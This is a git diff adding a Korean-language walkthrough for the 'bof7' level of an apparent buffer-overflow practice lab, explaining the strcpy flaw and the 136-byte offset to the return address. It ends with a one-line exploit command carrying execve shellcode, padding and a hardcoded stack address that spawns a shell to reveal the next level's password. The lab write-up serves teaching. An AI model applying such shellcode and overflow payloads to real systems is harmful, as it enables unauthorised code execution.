@@ -36,10 +36,29 @@ docker run -it --privileged ccss17/bof로 접속함으로써 해결할 수 있�
 
 ## ⚜️bof7 solution⚜️
 
+bof7.c의 구성을 보면
 
+<img width="641" alt="스크린샷 2021-07-16 오후 1 19 58" src="https://user-images.githubusercontent.com/86994067/125891667-ab2bd317-4412-4d1d-937b-f6ab49c7d039.png">
 
+취약점으로 strcpy 함수를 공략해야하는 것을 생각해볼 수 있다.
 
+<img width="1104" alt="스크린샷 2021-07-16 오후 1 19 05" src="https://user-images.githubusercontent.com/86994067/125892981-bf7b7c5c-76e0-4e39-8d77-0cac76a17fee.png">
 
+다음 사진을 보면 인자의 길이에 따라 주소값이 달라지는 것을 확인할 수 있다.
+이때 buf와 return address의 거리가 136이고 8바이트의 주소값을 덮어씌어야 한다. (총 144바이트의 인자값을 전달해야함)
+
+| 쉘 코드(buf) | 쓰레기 값(SFP) | 리턴 주소(RET) | 총 바이트 |
+| :--: | :--: | :--: | :--: |
+| 27 바이트 | 109 바이트 | 8 바이트 | 144바이트 |
+
+다음 페이로드를 생각했을 때 익스플로잇을 시도해보면
+
+<img width="1039" alt="스크린샷 2021-07-16 오후 1 22 12" src="https://user-images.githubusercontent.com/86994067/125894493-c18f274e-a29a-439b-b712-b78d82be5380.png">
+
+``` shell
+$ ./bof7 `python -c "print '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 'x'*109 + '\xb0\xea\xff\xff\xff\x7f'"`
+```
+다음 코드를 통해 bof8의 패스워드를 얻을 수 있다.
 
 
 
